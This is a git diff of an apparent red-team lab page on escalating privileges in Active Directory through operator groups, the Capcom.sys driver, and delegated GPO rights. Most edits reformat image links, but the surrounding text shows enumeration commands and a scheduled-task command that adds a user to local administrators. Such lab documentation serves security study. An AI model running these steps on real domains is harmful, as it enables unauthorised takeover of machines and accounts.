@@ -9,15 +9,15 @@ Administrators, Domain Admins, Enterprise Admins are well known AD groups that a
 
 Note the spotless' user membership:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-17-01-38.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-01-38.png>)
 
 However, we can still add new users:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-17-01-47.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-01-47.png>)
 
 As well as login to DC01 locally:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-17-05-35.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-05-35.png>)
 
 ## Server Operators
 
@@ -33,31 +33,31 @@ This membership allows users to configure Domain Controllers with the following 
 
 Note how we cannot access files on the DC with current membership:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-17-38-43.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-38-43.png>)
 
 However, if the user belongs to `Server Operators`:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-17-38-58.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-38-58.png>)
 
 The story changes:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-17-39-08.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-39-08.png>)
 
 ## Backup Operators
 
 As with `Server Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-17-42-47.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-42-47.png>)
 
 ## SeLoadDriverPrivilege
 
 A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka `NT\System`. See how `offense\spotless` user has this privilege:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-22-40-30.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 22-40-30.png>)
 
 `Whoami /priv` shows the privilege is disabled by default:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-21-59-15.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 21-59-15.png>)
 
 However, the below code allows enabling that privilege fairly easily:
 
@@ -111,7 +111,7 @@ int main()
 
 We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now enabled:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-22-45-54.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 22-45-54.png>)
 
 ### Capcom.sys Driver Exploit
 
@@ -124,7 +124,7 @@ PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
 PCWSTR pPathSourceReg = L"\\registry\\machine\\System\\CurrentControlSet\\Services\\SomeService";
 ```
 
-The first one declares a string variable indicating where the vulnerable Capcom.sys driver is located on the victim system and the second one is a string variable indicating a service name that will be used \(could be any service\) when executing the exploit:
+The first one declares a string variable indicating where the vulnerable Capcom.sys driver is located on the victim system and the second one is a string variable indicating a service name that will be used (could be any service) when executing the exploit:
 
 {% code title="privileges.cpp" %}
 ```cpp
@@ -215,19 +215,21 @@ int main()
 
 Once the above code is compiled and executed, we can see that our malicious `Capcom.sys` driver gets loaded onto the victim system:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-22-14-26%20%281%29.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 22-14-26 (1).png>)
 
-{% file src="../../.gitbook/assets/capcom.sys" caption="Capcom.sys" %}
+{% file src="../../.gitbook/assets/Capcom.sys" %}
+Capcom.sys
+{% endfile %}
 
 We can now download and compile the Capcom exploit from [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) and execute it on the system to elevate our privileges to `NT Authority\System`:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-17-23-40-56.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-17 23-40-56.png>)
 
 ## GPO Delegation
 
 Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-18-14-58-34.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-18 14-58-34.png>)
 
 We can see this by leveraging PowerView like so:
 
@@ -239,17 +241,19 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 
 The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-18-14-57-21.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-18 14-57-21.png>)
 
 More about general AD ACL/ACE abuse refer to the lab:
 
-{% page-ref page="abusing-active-directory-acls-aces.md" %}
+{% content-ref url="abusing-active-directory-acls-aces.md" %}
+[abusing-active-directory-acls-aces.md](abusing-active-directory-acls-aces.md)
+{% endcontent-ref %}
 
 ### Abusing the GPO Permissions
 
 We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-18-15-05-25.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-18 15-05-25.png>)
 
 If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:
 
@@ -257,7 +261,7 @@ If we want to search for misconfigured GPOs specifically, we can chain multiple 
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![](../../.gitbook/assets/screenshot-from-2018-12-20-11-41-55.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-20 11-41-55.png>)
 
 #### Computers with a Given Policy Applied
 
@@ -267,7 +271,7 @@ We can now resolve the computer names the GPO `Misconfigured Policy` is applied 
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
 
-![ws01.offense.local has &quot;Misconfigured Policy&quot; applied to it](../../.gitbook/assets/screenshot-from-2018-12-20-11-42-04.png)
+![ws01.offense.local has "Misconfigured Policy" applied to it](<../../.gitbook/assets/Screenshot from 2018-12-20 11-42-04.png>)
 
 #### Policies Applied to a Given Computer
 
@@ -275,7 +279,7 @@ Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -A
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
 
-![](../../.gitbook/assets/screenshot-from-2019-01-16-19-44-19.png)
+![](<../../.gitbook/assets/Screenshot from 2019-01-16 19-44-19.png>)
 
 #### OUs with a Given Policy Applied
 
@@ -283,7 +287,7 @@ Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
 
-![](../../.gitbook/assets/screenshot-from-2019-01-16-19-46-33.png)
+![](<../../.gitbook/assets/Screenshot from 2019-01-16 19-46-33.png>)
 
 #### Abusing Weak GPO Permissions
 
@@ -293,27 +297,27 @@ One of the ways to abuse this misconfiguration and get code execution is to crea
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 
-![](../../.gitbook/assets/screenshot-from-2018-12-20-13-43-46.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-20 13-43-46.png>)
 
 The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-20-13-40-11.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-20 13-40-11.png>)
 
 ### Force Policy Update
 
-ScheduledTask and its code will execute after the policy updates are pushed through \(roughly each 90 minutes\), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
+ScheduledTask and its code will execute after the policy updates are pushed through (roughly each 90 minutes), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-20-13-45-18.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-20 13-45-18.png>)
 
 ### Under the hood
 
 If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-20-12-02-22.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-20 12-02-22.png>)
 
 Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:
 
-{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml" %}
+{% code title="\\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
 ```markup
 <?xml version="1.0" encoding="utf-8"?>
 <ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
@@ -378,7 +382,7 @@ Below is the XML file that got created by `New-GPOImmediateTask` that represents
 
 The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:
 
-{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\Groups" %}
+{% code title="\\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
 ```markup
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
@@ -409,7 +413,7 @@ Additionally, we could think about leveraging logon/logoff scripts, using regist
 
 {% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}
 
-{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp\#L13" %}
+{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}
 
 {% embed url="https://github.com/tandasat/ExploitCapcom" %}
 
@@ -420,4 +424,3 @@ Additionally, we could think about leveraging logon/logoff scripts, using regist
 {% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}
 
 {% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}
-
